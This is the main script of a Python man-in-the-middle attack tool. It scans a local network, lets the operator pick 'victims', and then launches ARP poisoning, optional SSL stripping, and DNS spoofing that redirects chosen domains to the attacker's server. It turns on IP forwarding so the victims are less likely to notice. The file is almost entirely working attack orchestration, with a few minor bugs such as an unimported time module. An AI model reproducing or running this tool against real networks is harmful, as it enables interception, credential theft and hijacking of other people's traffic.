import multiprocessing, os, sys, threading
import arp, dns, ssl, scan, parser
from urllib.parse import urlparse
from time import sleep
import ipaddress, socket
sslRequested = False


def is_valid_link(x):
    try:
        result = urlparse(x)
        return all([result.scheme, result.netloc])
    except:
        return False

def is_valid_ip(x):
    try:
        ip = ipaddress.ip_address(x)
        return True
    except ValueError:
        return False


def spacing():
    print("------------------------------------------------------------------\n")


# scan the network for hosts
def discover():
    interface = ' '
    hosts = ' '
    try:
        interface = scan.interface()
        if not interface:
            raise Exception
    except Exception:
        print("There was an issue with the interface.")
        sys.exit()

    if interface:
        try:
            hosts = scan.ip(interface)
            if not hosts:
                raise Exception
            else:
                print("Successful scanning on the interface", interface)
                spacing()
                print("Do you want to poison all the hosts?")
                answr = yes_no()

                if answr == 0:  # yes
                    print("Poisoning all hosts on the interface", interface)
                else:  # no

                    print("The following hosts are up and running. Pick the number of the host(s) you want to poison:")
                    counter = 1
                    for host in hosts:
                        print("[", counter, "] Host with IP",
                              host[0], "and MAC", host[1])
                        counter += 1

                    index = list(map(int, input().split()))

                    temp = [hosts[i-1] for i in index]
                    hosts = []
                    hosts = temp.copy()
                    

        except Exception:
            print(
                "No hosts have been scanned in this interface. Configure some and try again.")
            sys.exit()

    return interface, hosts


def yes_no():

    def input_checker(val):
        # 0 -> yes
        # 1 -> no
        # everything else -> 2 - error, introduce again

        if val.lower() == 'yes' or val.lower() == 'y':
            return 0
        elif val.lower() == 'no' or val.lower() == 'n':
            return 1
        else:
            return 2

    answr = input()
    answr = input_checker(answr)

    while answr is 2:
        answr = input("We didn't quite catch that. Yes or no? \n")
        answr = input_checker(answr)

    return answr



#if not args.help
args = parser.import_args()

if args.ARP:
    interval = args.ARP

    spacing()

    interface, hosts = discover()

    spacing()

    # some threads around here i guess

    print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
    answr = yes_no()

    if answr is 0:
        sslRequested = True
        print("SSL Strip will be done")
    else:
        sslRequested = False
        print("No SSL strip.")

    spacing()

    # if silent

    if args.silent:
        print("Silent mode on. Forwarding intercepted packets to oiriginal destination")
        os.system("sysctl -w net.ipv4.ip_forward=1")
    else:
        print("Silent mode off. The victims might notice the attack and take measures against it.")
        os.system("sysctl -w net.ipv4.ip_forward=0")

    spacing()

    print("Begin ARP poisoning")

    spacing()

    # arpAttack = arp.Poison(interface, hosts, interval)
    # try:
    #     arpProcess = multiprocessing.Process(target=arpAttack.poison, name="ARP Poison")
    #     arpProcess.start()
    # except KeyboardInterrupt:
    #     print("Stopping the arp process.")

    # #sleep(5)

    # if sslRequested == True:
    #     ssl = ssl.SSLStrip()
    #     try:
    #         sslProcess = multiprocessing.Process(
    #             target=ssl.strip, name="SSL Strip")
    #         sslProcess.start()
    #     except KeyboardInterrupt:
    #         print("Stopping the arp process.")


    arp = arp.Poison(interface, hosts, interval)
    try:
        arpThread = threading.Thread(target=arp.poison, name="ARP Poison")
        arpThread.start()
    except KeyboardInterrupt:
        arpThread.join()

    sleep(5)

    if sslRequested == True:
        ssl = ssl.SSLStrip()
        try:
            sslThread = threading.Thread(target=ssl.strip, name="SSL Strip")
            sslThread.start()
        except KeyboardInterrupt:
            sslThread.join()

elif args.DNS:
    server = args.DNS

    if is_valid_ip(server):
        print("Which domains would you like to spoof? These will be redirected to your host server,", server)
        websites = input().split()

        to_spoof = []
        for link in websites:
            try:
                website_ip = socket.gethostbyname(link)
                to_spoof.append([link, website_ip])
            except Exception:
                print(link, "is not a valid link. It will not be spoofed.")

        if not to_spoof:
            print("None of the provided websited were valid domain names. Please retry.")
            sys.exit()
    else:
        print("It seems like the server IP provided as an argument is incorrect. Please reconfigure.")
        sys.exit()

    spacing()

    interface, hosts = discover()

    spacing()

    # setting up arp poison process with default recommended frequencey 10
    arp = arp.Poison(interface, hosts, 10)
    arpProcess = multiprocessing.Process(target=arp.poison, name="ARP Poison")
    arpProcess.start()

    # let the arp poisoning run a bit before starting dns poisoning
    time.sleep(5)

    # setting up dns poison proces
    dns = dns.Poison(interface, server, to_spoof)
    packet = dns.sniff()
    dnsProcess = multiprocessing.Process(target=dns.reply, args=(packet,), name="DNS Poison")
    dnsProcess.start()

elif args.silent and args.DNS:
    print("Oops! DNS poisoning does not support silent mode. The packets will not be forwarded.")
    sys.exit()